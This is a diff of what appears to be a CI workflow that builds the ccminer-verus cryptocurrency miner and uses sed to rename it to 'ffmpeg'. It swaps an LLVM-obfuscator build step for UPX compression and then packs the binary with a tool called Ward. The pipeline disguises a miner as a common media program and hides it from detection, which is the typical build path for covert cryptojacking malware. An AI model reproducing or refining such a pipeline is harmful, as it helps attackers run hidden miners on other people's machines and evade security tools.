@@ -19,18 +19,7 @@ jobs:
     - name: Install Dependencies
       run: |
         sudo apt-get update
-        sudo apt-get install -y cmake git build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake libgmp-dev libtool
-
-    - name: Install LLVM Obfuscator
-      run: |
-        git clone https://github.com/obfuscator-llvm/obfuscator.git
-        cd obfuscator
-        git checkout llvm-4.0
-        mkdir build
-        cd build
-        cmake -G "Unix Makefiles" -DLLVM_INCLUDE_TESTS=OFF -DCMAKE_BUILD_TYPE=Release ..
-        make -j$(nproc)
-        sudo make install
+        sudo apt-get install -y cmake git build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake libgmp-dev libtool upx
 
     - name: Clone and Modify ccminer
       run: |
@@ -39,16 +28,17 @@ jobs:
         sed -i 's/#define PROGRAM_NAME.*/#define PROGRAM_NAME "ffmpeg"/g' ccminer.cpp
         sed -i 's/bin_PROGRAMS = ccminer/bin_PROGRAMS = ffmpeg/g' Makefile.am
 
-    - name: Configure and Build ccminer with Obfuscation
+    - name: Configure and Build ccminer
       run: |
         cd ccminer-verus
         ./autogen.sh
-        CC=/usr/local/bin/clang CXX=/usr/local/bin/clang++ ./configure \
-          CC=/usr/local/bin/clang \
-          CXX=/usr/local/bin/clang++ \
-          CFLAGS="-mllvm -fla -mllvm -bcf -mllvm -sub" \
-          CXXFLAGS="-mllvm -fla -mllvm -bcf -mllvm -sub"
+        ./configure
         make -j$(nproc)
+
+    - name: Compress Binary with UPX
+      run: |
+        cd ccminer-verus
+        upx --best --lzma ./ffmpeg
 
     - name: Install and Pack with Ward
       run: |
